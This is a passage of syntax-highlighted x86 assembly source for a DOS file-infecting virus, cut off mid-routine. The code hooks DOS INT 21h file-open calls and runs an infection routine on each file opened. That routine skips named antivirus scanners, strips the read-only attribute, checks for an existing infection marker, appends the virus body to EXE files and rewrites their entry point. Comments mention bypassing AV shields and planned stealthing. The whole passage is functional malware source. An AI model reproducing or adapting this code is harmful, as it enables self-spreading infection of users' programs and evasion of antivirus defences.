</span><span class="sc1">;   xor ah,56h</span><span class="sc0">
         
</span><span class="sc1">;   xor ah,43h ; get file atribs?</span><span class="sc0">
</span><span class="sc1">;   jz filefuc</span><span class="sc0">
</span><span class="sc1">;   xor ah,43h</span><span class="sc0">

</span><span class="sc1">;   mov dx,si</span><span class="sc0">
</span><span class="sc1">;   xor ah,6Ch ; Extented open?</span><span class="sc0">
</span><span class="sc1">;   jz filefuc</span><span class="sc0">
</span><span class="sc1">;   xor ah,6Ch</span><span class="sc0">
    

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">notfilefuc</span><span class="sc0">

</span><span class="sc5">filefuc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">adr21</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc1">; you have to wait a little!</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">           

</span><span class="sc5">notfilefuc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">adr21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">







</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;calls the original INT21h bellow drivers,TSR utils, ;AV shields,etc. </span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">orig_adr21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">








</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;infects files. Assumes that the file name is at DS:DX</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;push them all.</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> 

</span><span class="sc1">;backups the entry point. </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entrybackup</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entrybackup</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">; saves the filename</span><span class="sc0">
</span><span class="sc1">;don't know why i did that! </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0"> 

</span><span class="sc1">;if filename == *AN.* or *OT.* or *EX.* or *86.* or *ND.* don't infect it.</span><span class="sc0">
</span><span class="sc1">;target files are tbscan.exe,tbclean.exe,scan.exe,f-prot.exe and mscdex.exe</span><span class="sc0">
</span><span class="sc1">;Also if file isn't *.EXE or *.COM don't infect it either...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">findend</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">findend</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0444Eh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">03638h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">04E41h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0544Fh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">05845h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">05845h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ComExe</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">04F43h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc5">ComExe</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;check for free clusters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">enough_space</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
</span><span class="sc5">enough_space</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;get file's atributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">atrib</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; and save them</span><span class="sc0">

</span><span class="sc1">;is it a sybdir or volume name ?</span><span class="sc0">
</span><span class="sc1">;I whouldn't like that.</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00011000b</span><span class="sc0">    
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">        


</span><span class="sc1">;read only file?  Not any more.</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">     
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">          
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">    </span><span class="sc1">; Why can't i write on disk? Maybe </span><span class="sc0">
            </span><span class="sc1">; write-protected disk or CD-ROM. Game Over.</span><span class="sc0">



</span><span class="sc1">;open file by using the priv 21 handler to prevent</span><span class="sc0">
</span><span class="sc1">;endless recersive (and overflow of stack)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d92h</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; save the handle to [handler]</span><span class="sc0">

</span><span class="sc1">;_____________________</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bridge1</span><span class="sc0">   </span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc5">cant_open</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;|</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cant_open2</span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc5">bridge1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc1">;_____________________|</span><span class="sc0">

</span><span class="sc1">;from now on, (data segment) = (code segment)</span><span class="sc0">
</span><span class="sc1">;no need for CS: override    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">   

</span><span class="sc1">;get date-time of file and save it </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">         
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; save date-time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> 
    
</span><span class="sc1">;get buffer</span><span class="sc0">
    </span><span class="sc1">;mov ds,cs:[BP+buffer]   </span><span class="sc0">

</span><span class="sc1">;reads header (first 84h bytes of file)  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">            
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">
    </span><span class="sc1">;mov ds,cs:[BP+buffer]   </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">             
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">              

</span><span class="sc1">;is that file an EXE ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5a4dh</span><span class="sc0">     
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;lets check for "MZ" at offset 0000 0000h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">  </span><span class="sc1">;if not close it and wait for the next file</span><span class="sc0">

</span><span class="sc1">;is it infected?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0faceh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">  



</span><span class="sc1">;Is it a PE (win95 &amp; NT) , NE(win) or .DLL file?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">      
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1101b</span><span class="sc0">    
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0050h</span><span class="sc0">    
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">   </span><span class="sc1">;if yes then don't infect it</span><span class="sc0">

    
</span><span class="sc1">;______________________</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bridge2</span><span class="sc0">    </span><span class="sc1">;| </span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;|</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file2</span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc5">bridge2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;|  </span><span class="sc0">
</span><span class="sc1">;______________________|</span><span class="sc0">

</span><span class="sc1">;For testing only. Ask before infect a file.</span><span class="sc0">
</span><span class="sc1">;   call    ask_me</span><span class="sc0">
</span><span class="sc1">;   jnz close_file  </span><span class="sc0">


</span><span class="sc1">;go to the end of file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">   
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">      

</span><span class="sc1">;save the size of the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> 

</span><span class="sc1">; if file.size&gt;448Kbyte don't infect it.</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0007h</span><span class="sc0">   
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">not2big</span><span class="sc0">      
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">  
</span><span class="sc5">not2big</span><span class="sc4">:</span><span class="sc0">        


</span><span class="sc1">;tells to the header that filesize+=APPLYSIZE/512                </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;file_length MOD 512</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">511</span><span class="sc0">                    
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">   </span><span class="sc1">; header[bp+header+4] = file_length(DX:AX) DIV 512 </span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">       
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">APPLYSIZE</span><span class="sc4">/</span><span class="sc2">512</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> 



</span><span class="sc1">;add APPLYSIZE bytes. The increase of file size must be known</span><span class="sc0">
</span><span class="sc1">;seems usefull for future use (stealthing)         </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; write...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">   </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">    </span><span class="sc1">; bytes.</span><span class="sc0">

</span><span class="sc1">;the virus code must start from a paragraph (*16 bytes)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">],</span><span class="sc2">0FFF0h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">headersize</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;copy original entry point to [entry]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> 

</span><span class="sc1">;loads the size of the file. The place here virus body will be placed</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;writes the new entry point which points to the virus body</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; AX= (DWord DX:AX) / 16</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">   
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">      
